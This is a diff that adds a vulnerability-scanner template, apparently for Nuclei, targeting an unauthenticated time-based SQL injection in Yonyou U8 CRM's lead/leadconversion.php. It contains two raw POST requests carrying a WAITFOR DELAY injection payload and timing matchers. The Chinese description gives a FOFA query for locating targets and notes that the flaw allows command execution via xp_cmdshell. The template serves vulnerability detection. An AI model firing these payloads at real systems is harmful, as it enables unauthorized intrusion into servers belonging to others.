@@ -1,0 +1,38 @@
+id: yongyouU8-CRM-leadconversion_php-sql
+
+info:
+  name: "用友U8 CRM lead SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: title="用友U8CRM"
+      用友U8 CRM客户关系管理系统中的lead/leadconversion.php路径存在SQL注入安全缺陷。远程攻击者无需身份验证即可通过构造恶意SQL语句利用该缺陷，借助xpcmdshell扩展存储过程执行系统命令，实现后门植入与服务器控制。
+  reference:
+  - https://mp.weixin.qq.com/s/h0KEcTpu6qcZld0S6wKgeA?token=523748735&lang=zh_CN
+  tags: 用友U8
+
+
+http:
+- raw:
+  - |
+    POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    userid=1%27;WAITFOR+DELAY+%270:0:4%27--
+  - |
+    POST /lead/leadconversion.php?DontCheckLogin=1&Action=getDeptName HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+    Cookie: PHPSESSID=bgsesstimeout-;
+    Content-Type: application/x-www-form-urlencoded; charset=utf-8
+
+    userid=1%27;WAITFOR+DELAY+%270:0:8%27--
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
